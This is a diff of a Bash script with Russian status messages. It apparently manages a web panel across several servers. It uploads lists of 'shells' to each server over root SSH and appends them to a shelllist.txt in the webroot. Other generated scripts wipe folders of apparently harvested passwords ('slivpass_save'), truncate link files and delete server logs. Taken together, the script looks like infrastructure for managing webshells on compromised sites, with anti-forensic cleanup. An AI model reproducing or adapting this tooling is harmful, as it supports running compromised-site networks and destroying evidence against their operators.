@@ -197,49 +197,48 @@ echo -e " ${GREEN}Now we connect to $server !${NC}"
 #sshpass -p ${passwordserver} ssh-copy-id -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa.pub -p $port root@${server}
 #sleep 1
 
-if port=50099; then
+if [[ "$port" = "50099" ]] ; then
 
-if scp -i /root/.ssh/id_rsa -P $port /root/shells/${server_id}.txt root@${server}:~/newshells.txt; then
-echo "Шеллы успешно загружены на ${server}"
-else
-echo "Ошибка загрузки шеллов на ${server}"
-fi
+ if scp -i /root/.ssh/id_rsa -P $port /root/shells/${server_id}.txt root@${server}:~/newshells.txt; then
+ echo "Шеллы успешно загружены на ${server}"
+ else
+ echo "Ошибка загрузки шеллов на ${server}"
+ fi
 
 #sshpass -p ${passwordserver} scp -P $port /root/shells/${server_id}.txt root@176.10.118.210:newshells.txt
 
 
+ if ssh -n -p $port -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no root@${server} 'bash ~/shells_updater.sh'; then
 
-if ssh -n -p $port -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no root@${server} 'bash ~/shells_updater.sh'; then
-
-echo "Шеллы успешно обновлены на ${server}"
-else
-echo "Ошибка обновления шеллов на ${server}"
-fi
-
+ echo "Шеллы успешно обновлены на ${server}"
+ else
+ echo "Ошибка обновления шеллов на ${server}"
+ fi
 
 
 
-elif port=22; then
 
-if scp -i /root/.ssh/id_rsa -P $port /root/shells/${server_id}.txt root@${server}:~/newshells.txt; then
-echo "Шеллы успешно загружены на ${server}"
-else
-echo "Ошибка загрузки шеллов на ${server}"
-fi
+elif [[ "$port" = "22" ]] ; then
+
+ if scp -i /root/.ssh/id_rsa -P $port /root/shells/${server_id}.txt root@${server}:~/newshells.txt; then
+ echo "Шеллы успешно загружены на ${server}"
+ else
+ echo "Ошибка загрузки шеллов на ${server}"
+ fi
 
 cat > ~/shells_updater_new.sh << ELF
 #!/bin/bash
 
-chattr -i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/shelllist.txt
-chattr -i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/goodshelllist.txt
-chattr -i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/blackshell.txt
+#chattr -i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/shelllist.txt
+#chattr -i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/goodshelllist.txt
+#chattr -i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/blackshell.txt
 
 cat /root/newshells.txt >> /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/shelllist.txt
 #cat /root/newshells.txt >> /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/goodshelllist.txt
 
-chattr +i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/shelllist.txt
-chattr +i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/goodshelllist.txt
-chattr +i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/blackshell.txt
+#chattr +i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/shelllist.txt
+#chattr +i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/goodshelllist.txt
+#chattr +i /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/blackshell.txt
 ELF
 
 sed -i "s#\<IP_TO_REPLACE\>#$server#g" /root/shells_updater_new.sh
@@ -257,9 +256,7 @@ fi
 
 else
 
-
 echo "В списке серверов не указаны порты"
-
 exit 0
 
 fi
@@ -386,10 +383,9 @@ find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/data -mindepth 1 -maxdepth 1
 find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/data2 -mindepth 1 -maxdepth 1 | xargs rm -rf
 find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/slivpass_save -mindepth 1 -maxdepth 1 | xargs rm -rf
 find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/slivpass_save_solt/ -mindepth 1 -maxdepth 1 | xargs rm -rf
-#find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/links -maxdepth 2 -type f -exec truncate --size 0 "{}" \;
+find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/links -maxdepth 2 -type f -exec truncate --size 0 "{}" \;
 rm /var/www/ku/data/www/IP_TO_REPLACE/app/tmp/logs/error.log
 find /var/www/ku/data/logs -mindepth 1 -maxdepth 1 | xargs rm -rf
-rm /var/www/ku/data/logs
 ELF
 
 sed -i "s#\<IP_TO_REPLACE\>#$server#g" /root/remote_delete_downloaded_files.sh
@@ -410,18 +406,16 @@ cat > ~/remote_delete_logs.sh << ELF
 #!/bin/bash
 find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/slivpass_save -mindepth 1 -maxdepth 1 | xargs rm -rf
 find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/slivpass_save_solt/ -mindepth 1 -maxdepth 1 | xargs rm -rf
-#find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/links -maxdepth 2 -type f -exec truncate --size 0 "{}" \;
+find /var/www/ku/data/www/IP_TO_REPLACE/app/webroot/links -maxdepth 2 -type f -exec truncate --size 0 "{}" \;
 rm /var/www/ku/data/www/IP_TO_REPLACE/app/tmp/logs/error.log
-
 find /var/www/ku/data/logs -mindepth 1 -maxdepth 1 | xargs rm -rf
-rm /var/www/ku/data/logs
 ELF
 
 sed -i "s#\<IP_TO_REPLACE\>#$server#g" /root/remote_delete_logs.sh
 
 ssh -p $port -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no root@${server} 'bash -s' < /root/remote_delete_logs.sh
 
-echo "мусор на ${server} успешно очищен"
+echo "мусор на $server успешно очищен"
 
 done < /root/main_servers_list
 }
@@ -487,4 +481,3 @@ echo ""
     break
   fi
 done
-
